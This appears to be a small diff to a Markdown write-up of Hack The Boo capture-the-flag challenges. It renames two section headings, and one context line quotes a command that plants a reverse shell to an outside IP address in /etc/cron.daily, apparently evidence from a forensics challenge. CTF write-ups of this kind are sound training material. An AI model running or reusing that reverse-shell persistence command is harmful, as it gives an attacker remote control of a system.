@@ -1,4 +1,4 @@
-# Practice Challenges
+# Scenario (Practice Challenges)
 Prepare yourselves, travelers!
 
 Creatures have been stirring in the depths of night. Monstrosities emboldened by the lack of monster slayers have heard their names spoken under fearful breaths. As the Hack The Boo tales are brought to life over a campfire, the unsuspecting villagers cling to the light of the fire in hopes of an even brighter dawn.
@@ -107,7 +107,7 @@ echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect &
 
 ![vul6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a9bbfa96-a62f-49aa-8d85-7ba1410c8684)
 
-# Competition Challenges
+# Scenario (Competition Challenges)
 Are you afraid of the dark?
 
 A fog begins to hang over the villagers, as the denizens of the night have sensed their location deep in the forest. Tooth, claw, and hoof press forward to devour their prey.A grim future awaits our stalwart storytellers. It’s up to you, slayers! 
